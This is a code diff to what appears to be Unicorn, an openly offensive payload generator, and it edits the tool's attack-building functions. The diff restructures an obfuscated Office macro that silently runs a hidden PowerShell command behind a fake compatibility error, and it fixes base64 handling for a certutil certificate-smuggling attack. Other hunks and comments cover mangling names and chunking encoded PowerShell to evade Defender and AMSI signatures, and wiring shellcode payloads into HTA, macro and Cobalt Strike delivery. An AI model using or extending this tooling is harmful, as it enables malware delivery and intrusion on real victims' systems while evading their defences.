@@ -630,7 +630,6 @@ def generate_macro(full_attack, line_length=50):
     function2 = generate_random_string(5, 15)
     function3 = generate_random_string(5, 15)
     function4 = generate_random_string(5, 15)
-    function5 = generate_random_string(5, 15)
     function6 = generate_random_string(5, 15)
 
     # our message we present to the end user - can change this to whatever you want
@@ -640,7 +639,7 @@ def generate_macro(full_attack, line_length=50):
     subject_message = ("Microsoft Office (Compatibility Mode)")
  
     # our final product of obfsucated code - note that defender made a signature to look for WScript.Run with a compacted string with a "False" terminal window. Just needed to split it out into two lines :P
-    macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\nDim waitOnReturn As Boolean: waitOnReturn = False\nDim windowStyle As Integer: windowStyle = 0\nDim {14}\n{14} = {15} & " "\n{17}.Run {18} & {19}, windowStyle, waitOnReturn\n\nDim title As String\ntitle = "{21}"\nDim msg As String\nDim intResponse As Integer\nmsg = "{20}"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6,macro_rand,macro_message,subject_message))
+    macro_str += ("""\n\nDim {0}\n{0} = {1}\nDim {2}\n{2} = {3}\nDim {4}\n{4} = {2} & "." & {0}\nDim {5}\nSet {5} = VBA.CreateObject({4})\nDim waitOnReturn As Boolean: waitOnReturn = False\nDim windowStyle As Integer: windowStyle = 0\nDim {6}\n{6} = {7} & " "\n{5}.Run {6} & {8}, windowStyle, waitOnReturn\n\nDim title As String\ntitle = "{10}"\nDim msg As String\nDim intResponse As Integer\nmsg = "{9}"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, shell, function2, wscript, function3, function4, function6, ps_long, macro_rand, macro_message, subject_message))
 
     # strip and fix issues
     macro_str = macro_str.replace("''", "")
@@ -662,7 +661,7 @@ def gen_cert_attack(filename):
 
         print("[*] Importing in binary file to base64 encode it for certutil prep.")
         data = open(filename, "rb").read()
-        data = base64.b64encode(data)
+        data = base64.b64encode(data).decode("ascii")
         print("[*] Writing out the file to decode_attack/encoded_attack.crt")
         write_file("decode_attack/encoded_attack.crt",
                    "-----BEGIN CERTIFICATE-----\n{0}\n-----END CERTIFICATE-----".format(data))
@@ -921,16 +920,12 @@ def gen_shellcode_attack(payload, ipaddr, port):
     # generate random service name from win32 - defender was looking from name win32 + 0x00 length inside of byte array
     randomize_service_name = generate_random_string(2,2)
 
-    # randomize kernel32.dll for fun
-    random_length = generate_random_number(1,12)
-
     # random var name  
     full_command = generate_random_string(2,2)
 
     # randomize kernel32.dll and msvcrt.dll
     kernel = mangle_word("kernel32.dll")
     msv = mangle_word("msvcrt.dll")
-    Win32 = mangle_word("Win32Functions")
     true_mangle = mangle_word("True")
     # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily
     random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
@@ -998,12 +993,11 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     ran1 = generate_random_string(2, 3)
     ran2 = generate_random_string(2, 3)
     ran3 = generate_random_string(2, 3)
-    ran4 = generate_random_string(2, 3)
 
     # format payload is for adding chunking to evade detection
     avblah = base64.b64encode(powershell_code.encode('utf_16_le')) # kinder gentler dave variable name now
     # here we mangle our encodedcommand by splitting it up in random chunks
-    avsux = randomint = random.randint(4000,5000)
+    avsux = random.randint(4000,5000)
     avnotftw = [avblah[i: i + avsux] for i in range(0, len(avblah), avsux)]
     haha_av = ""
     counter = 0
@@ -1015,9 +1009,6 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy
         haha_av = haha_av.replace("==", "'+'==")
         counter = 1
-    random_quotes = ["''", '\\"\\"' ]
-    mangle_quotes = (random.choice(random_quotes))
-
     full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
 
     # if we want to use AMSI bypassing
@@ -1312,6 +1303,12 @@ try:
 
             elif sys.argv[2] == "shellcode":
                 attack_type = "shellcode"
+                if "hta" in sys.argv:
+                    attack_modifier = "hta"
+                if "ms" in sys.argv:
+                    attack_modifier = "ms"
+                if "macro" in sys.argv:
+                    attack_modifier = "macro"
 
             else:
                 attack_type = "msf"
@@ -1355,10 +1352,8 @@ try:
         ipaddr = "cobaltstrike"
         port = "cobaltstrike"
         ps = gen_shellcode_attack(payload, ipaddr, port)
-        if attack_modifier != "hta":
-            if attack_modifier != "macro":
-                if attack_modifier != "ms":
-                    attack_modifier = ("cs")
+        if attack_type == "cs" and attack_modifier not in ("hta", "macro", "ms"):
+            attack_modifier = ("cs")
 
         format_payload(ps, attack_type, attack_modifier, None)
 
@@ -1426,3 +1421,4 @@ except KeyboardInterrupt:
 except Exception as e:
     if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python3 unicorn.py for all usage.")
     else: print("[!] Something went wrong, printing the error: " + str(e))
+    sys.exit(1)
